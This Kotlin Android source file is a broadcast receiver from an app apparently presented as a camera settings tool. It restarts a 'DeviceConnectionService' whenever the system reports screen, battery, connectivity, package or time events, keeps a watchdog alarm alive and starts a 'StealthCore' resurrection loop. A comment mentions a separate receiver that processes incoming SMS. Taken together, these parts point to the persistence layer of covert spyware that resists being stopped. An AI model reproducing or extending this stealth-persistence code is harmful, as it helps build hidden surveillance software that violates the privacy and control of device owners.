package com.settingpro.camera.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import com.settingpro.camera.data.local.SettingsDataStore
import com.settingpro.camera.util.AppLogger
import com.settingpro.camera.util.Constants.MULTI_EVENT_DEBOUNCE_MS
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.flow.first
import java.util.concurrent.atomic.AtomicLong
import javax.inject.Inject

/**
 * Multi-event receiver that listens for various system events and restarts
 * the service if it has been killed.
 *
 * Triggers on: screen on/off, battery changes, power connected/disconnected,
 * timezone/time changes, locale changes, airplane mode, connectivity changes,
 * package changes, and headset plug events.
 *
 * NOTE: SMS_RECEIVED is intentionally NOT handled here — SmsReceiver owns
 * that action exclusively to keep message processing deterministic.
 */
@AndroidEntryPoint
class MultiEventReceiver : BroadcastReceiver() {

    @Inject
    lateinit var settingsDataStore: SettingsDataStore

    companion object {
        private const val TAG = "MultiEventReceiver"

        // AtomicLong is safe for concurrent delivery across multiple broadcast
        // queues without needing synchronization blocks.
        //
        // FIX #5: elapsedRealtime() returns Long (64-bit), so overflow occurs at
        // ~292 million years of uptime — not a practical concern. The previous
        // review note about 49-day overflow applied only to Int; this is correct
        // as written. No code change required; the comment is clarified here.
        private val lastRestartAttemptMs = AtomicLong(0L)
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        AppLogger.d(TAG, "Event received: $action")

        // Check if permissions are granted before starting service
        val job = kotlinx.coroutines.Job()
        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob(job))
        scope.launch {
            try {
                val permissionsGranted = settingsDataStore.permissionsGranted.first()
                if (!permissionsGranted) {
                    AppLogger.d(TAG, "Permissions not yet granted — skipping service start")
                    return@launch
                }

                // Continue with service start logic
                attemptServiceRestart(context, action)
            } finally {
                job.cancel()
            }
        }
    }

    private fun attemptServiceRestart(context: Context, action: String) {
        // Skip if the service is already running — nothing to do.
        if (DeviceConnectionService.isServiceRunning()) {
            AppLogger.d(TAG, "Service running — skipping restart")
            // Always keep the alarm watchdog alive regardless.
            AlarmReceiver.scheduleAlarm(context)
            return
        }

        // Gate all restart attempts behind a debounce window. Without this, a
        // rapid sequence of SCREEN_ON / CONNECTIVITY_CHANGE / BATTERY_CHANGED
        // events would fire startForegroundService() many times per second,
        // overwhelming the service's ability to call startForeground() in time.
        val now = SystemClock.elapsedRealtime()
        val last = lastRestartAttemptMs.get()
        if (now - last < MULTI_EVENT_DEBOUNCE_MS) {
            AppLogger.d(TAG, "Debounced restart attempt (last was ${now - last}ms ago)")
            return
        }

        // CAS ensures only one thread wins the restart slot if two events arrive
        // simultaneously at the debounce boundary.
        if (!lastRestartAttemptMs.compareAndSet(last, now)) {
            AppLogger.d(TAG, "Concurrent restart attempt lost CAS — skipping")
            return
        }

        try {
            AppLogger.w(TAG, "Service not running — restarting (triggered by $action)")
            val serviceIntent = Intent(context, DeviceConnectionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            // Also ensure the fine-grained resurrection loop is running.
            StealthCore.startResurrectionLoop(context)
        } catch (e: Exception) {
            AppLogger.e(TAG, "Error restarting service", e)
        }

        // Ensure the coarse watchdog alarm is always scheduled.
        AlarmReceiver.scheduleAlarm(context)
    }
}